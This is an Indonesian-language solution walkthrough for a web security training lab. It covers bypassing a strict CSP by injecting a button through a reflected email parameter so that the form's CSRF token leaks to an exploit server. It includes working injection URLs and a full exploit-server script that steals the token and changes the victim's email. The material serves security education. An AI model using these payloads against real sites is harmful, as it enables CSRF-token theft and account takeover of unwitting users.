# Reflected XSS protected by very strict CSP, with dangling markup attack

Lab ini menggunakan **CSP (Content Security Policy) yang ketat** yang mencegah browser memuat subresource dari domain eksternal.

Untuk menyelesaikan lab ini, lakukan serangan **form hijacking** yang berhasil **melewati CSP**, mencuri **CSRF token milik user korban yang disimulasikan**, lalu menggunakan token tersebut untuk mengubah email menjadi:

`hacker@evil-user.net`

Kamu harus memberi label pada vektor serangan kamu dengan kata **"Click"** agar user simulasi terdorong untuk mengkliknya. Contohnya:

```html id="p7k2xq"
<a href="">Click me</a>
```

Kamu bisa login ke akun sendiri menggunakan kredensial berikut: `wiener:peter`


> Untuk mencegah platform Academy digunakan menyerang pihak ketiga, firewall kami memblokir interaksi antara lab dan sistem eksternal sembarangan. Jadi untuk menyelesaikan lab ini, kamu harus menggunakan **exploit server yang telah disediakan**.


## Solusi

1. Masuk ke lab menggunakan kredensial yang disediakan di atas.

2. Interaksi dengan fungsi **change email**. Perhatikan bahwa injeksi payload XSS umum seperti `<img src onerror=alert(1)>` diblokir oleh validasi sisi klien.

3. Gunakan **DevTools browser** untuk memeriksa elemen input email. Perhatikan bahwa:

```html
<form class="login-form" name="change-email-form" action="/my-account/change-email" method="POST">
  <label>Email</label>
  <input required="" type="email" name="email" value="">
  <input required="" type="hidden" name="csrf" value="PPD3Gys9C57Eug5MUoBO4mpR0PAq48Fh">
  <button class="button" type="submit"> Update email </button>
</form>

```

   * Kamu bisa mengubah tipe input dari `email` menjadi `text` untuk melewati validasi sisi klien.
   * Di dalam form terdapat field input tersembunyi yang berisi **CSRF token**, yang berarti token tersebut diperlukan untuk proses perubahan email.

4. Ubah payload menjadi:

```html 
foo@example.com"><img src= onerror=alert(1)>
```

dengan menyisipkannya dalam format email yang valid agar terlihat sah dan bisa melewati validasi sisi klien.

5. Kirim payload tersebut. Perhatikan bahwa payload ditampilkan di halaman, tetapi sudah di-escape sehingga tidak dieksekusi. Ini menunjukkan bahwa server sudah melakukan sanitasi input dengan benar, dan kemungkinan ada proteksi tambahan seperti CSP.

```html
<span id="user-email">foo@example.com"&gt;&lt;img src= onerror=alert(1)&gt;</span>
```

6. Setelah itu, tambahkan parameter `email` di URL untuk menguji refleksi XSS:

```
https://YOUR-LAB-ID.web-security-academy.net/my-account?email=<img src onerror=alert(1)>
```

7. Load URL tersebut. Perhatikan bahwa payload ditampilkan tetapi tidak berjalan, kemungkinan karena CSP memblokir eksekusi script.

8. Untuk memastikan, cek DevTools console. Akan terlihat pesan bahwa script inline diblokir oleh CSP.

9. Karena CSP memblokir payload, kita perlu mencoba bypass dengan mengecek kelemahan seperti kurangnya directive `form-action`.

10. Buka exploit server dan salin URL exploit (termasuk `/exploit`), misalnya:

```
https://exploit-YOUR-ID.exploit-server.net/exploit
```

11. Gunakan kerentanan XSS pada parameter email untuk menyisipkan tombol:

```
https://YOUR-LAB-ID.web-security-academy.net/my-account?email=foo@bar"><button formaction="https://exploit-YOUR-ID.exploit-server.net/exploit">Click me</button>
```



12. Pastikan:

* Ada parameter `email` agar XSS terpicu
* Email dalam format valid agar validasi sisi klien lolos
* Tanda kutip ditutup dengan benar agar HTML tidak rusak
* Button memiliki atribut `formaction` menuju exploit server

13. Load URL tersebut. Akan muncul tombol injeksi di halaman dan form email terisi valid.

```html
<form class="login-form" name="change-email-form" action="/my-account/change-email" method="POST">
  <label>Email</label>
  <input required="" type="email" name="email" value="foo@bar"><button formaction="https://exploit-0aa600ea03c7465a80673aab002c00de.exploit-server.net/exploit">Click me</button>"&gt;
  <input required="" type="hidden" name="csrf" value="PPD3Gys9C57Eug5MUoBO4mpR0PAq48Fh">
  <button class="button" type="submit"> Update email </button>
</form>
```

14. Klik tombol tersebut. Kamu akan diarahkan ke exploit server. Ini menunjukkan form submission berhasil dialihkan ke server eksternal.

15. Perhatikan bahwa CSRF token tidak terlihat di URL karena request menggunakan metode **POST**.

16. Karena CSRF token diperlukan untuk perubahan email, kita harus membuat token ikut terbawa dengan mengubah metode menjadi **GET**.

17. Modifikasi payload dengan menambahkan `formmethod="get"`:

```
https://YOUR-LAB-ID.web-security-academy.net/my-account?email=foo@bar"><button formaction="https://exploit-YOUR-ID.exploit-server.net/exploit" formmethod="get">Click me</button>
```


18. Klik tombol lagi. Kali ini CSRF token akan muncul di URL exploit server.

## 19. Script exploit di exploit server (Body)

```html 
<body>
<script>

const academyFrontend = "https://your-lab-url.net/";
const exploitServer = "https://your-exploit-server.net/exploit";

const url = new URL(location);
const csrf = url.searchParams.get('csrf');

if (csrf) {

    const form = document.createElement('form');
    const email = document.createElement('input');
    const token = document.createElement('input');

    token.name = 'csrf';
    token.value = csrf;

    email.name = 'email';
    email.value = 'hacker@evil-user.net';

    form.method = 'post';
    form.action = `${academyFrontend}my-account/change-email`;

    form.append(email);
    form.append(token);
    document.documentElement.append(form);
    form.submit();

} else {

    location = `${academyFrontend}my-account?email=blah@blah%22%3E%3Cbutton+class=button%20formaction=${exploitServer}%20formmethod=get%20type=submit%3EClick%20me%3C/button%3E`;

}

</script>
</body>
```

---

20. Ganti `academyFrontend` dan `exploitServer` sesuai URL lab dan exploit server kamu.
21. Klik **Store**, lalu **Deliver exploit to victim**.
22. Email user akan berubah menjadi `hacker@evil-user.net`.
